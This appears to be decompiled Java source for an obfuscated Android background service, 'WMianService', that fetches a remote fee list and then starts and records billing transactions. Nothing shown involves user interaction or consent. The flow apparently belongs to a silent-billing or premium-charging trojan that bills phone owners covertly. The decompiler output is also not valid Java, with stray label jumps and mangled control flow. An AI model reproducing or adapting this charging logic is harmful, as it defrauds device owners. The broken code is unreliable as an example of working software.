package com.wq.goo.rev;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.text.TextUtils;
import com.wq.dd.data.c;
import com.wq.dd.data.f;
import com.wq.intent.http.d;
import com.wq.intent.http.i;
import com.wq.intent.http.j;
import com.wq.ll.logic.g;
import java.util.List;

public class WMianService
  extends Service
  implements com.wq.intent.http.a, d, i, j
{
  private g a;
  private com.wq.dd.data.b b;
  private Handler c = new a(this);
  
  public WMianService() {}
  
  private boolean isAddFid(Context paramContext, com.wq.dd.data.b paramB)
  {
    boolean bool2 = false;
    paramContext = f.k(paramContext).split("\\|");
    int i = 0;
    for (;;)
    {
      boolean bool1;
      if (i >= paramContext.length) {
        bool1 = true;
      }
      do
      {
        return bool1;
        bool1 = bool2;
      } while (paramB.d().equals(paramContext[i]));
      i += 1;
    }
  }
  
  private boolean isNull(String paramString)
  {
    return (!TextUtils.isEmpty(paramString)) && (!"0".equals(paramString));
  }
  
  private void readyBilling(com.wq.dd.data.b paramB)
  {
    f.i(getApplicationContext(), paramB.l());
    f.h(getApplicationContext(), paramB.b());
    f.k(getApplicationContext(), paramB.a());
    if (TextUtils.isEmpty(f.k(getApplicationContext())))
    {
      f.j(getApplicationContext(), paramB.d());
      f.f(getApplicationContext(), paramB.i());
      f.e(this, paramB.h());
      if (!TextUtils.isEmpty(paramB.c())) {
        break label276;
      }
    }
    label276:
    for (c.n = "1";; c.n = "0")
    {
      this.a.a(paramB.a(), paramB.d(), "1", c.n, this);
      if (!TextUtils.isEmpty(paramB.g().trim())) {
        this.a.a(paramB.g(), this, this);
      }
      return;
      f.j(getApplicationContext(), f.k(getApplicationContext()) + "|" + paramB.d());
      if (!TextUtils.isEmpty(paramB.i())) {
        f.f(getApplicationContext(), f.d(getApplicationContext()) + "|" + paramB.i());
      }
      if (TextUtils.isEmpty(paramB.h())) {
        break;
      }
      f.e(this, f.c(getApplicationContext()) + "|" + paramB.h());
      break;
    }
  }
  
  private void startBilling(com.wq.dd.data.b paramB)
  {
    if (paramB != null)
    {
      String str1 = paramB.m().trim();
      String str2 = paramB.b().trim();
      if ((isNull(str2)) && (isNull(paramB.d())))
      {
        Message localMessage = new Message();
        localMessage.obj = paramB;
        f.b(getApplicationContext(), true);
        f.a(getApplicationContext(), System.currentTimeMillis());
        if ("0".equals(str1))
        {
          c.L = "1";
          localMessage.arg1 = Integer.parseInt(str2);
          localMessage.what = 0;
          this.c.sendMessage(localMessage);
        }
        while (!"1".equals(str1)) {
          return;
        }
        localMessage.what = 1;
        localMessage.arg1 = Integer.parseInt(str2);
        this.c.sendMessage(localMessage);
        return;
      }
      f.b(getApplicationContext(), false);
      return;
    }
    f.b(getApplicationContext(), false);
  }
  
  public void feeListResponse(Object paramObject, boolean paramBoolean)
  {
    if ((!paramBoolean) && (paramObject != null))
    {
      paramObject = (List)paramObject;
      if ((paramObject.size() > 0) && (((com.wq.dd.data.b)paramObject.get(0)).a() != "0"))
      {
        c.b(getApplicationContext());
        new b(this, paramObject).start();
        return;
      }
      f.b(getApplicationContext(), false);
      return;
    }
    f.b(getApplicationContext(), false);
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onDestroy()
  {
    super.onDestroy();
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    c.a(this);
    this.a = new g();
    if (TextUtils.isEmpty(c.g)) {
      c.g = f.b(getBaseContext());
    }
    if (TextUtils.isEmpty(c.e)) {
      c.e = f.a(getBaseContext());
    }
    e.a(new Handler(), getApplicationContext());
    this.a.a(this, getApplicationContext());
    return super.onStartCommand(paramIntent, paramInt1, paramInt2);
  }
  
  public void response(Object paramObject, boolean paramBoolean) {}
  
  public void response1(Object paramObject, boolean paramBoolean, String paramString) {}
  
  public void responseLog(Object paramObject, boolean paramBoolean, String paramString) {}
  
  public void responsePlay(Object paramObject, boolean paramBoolean)
  {
    if ((!paramBoolean) && (!TextUtils.isEmpty(this.b.e()))) {
      new com.wq.mm.process.a(this, this.b).a();
    }
  }
}
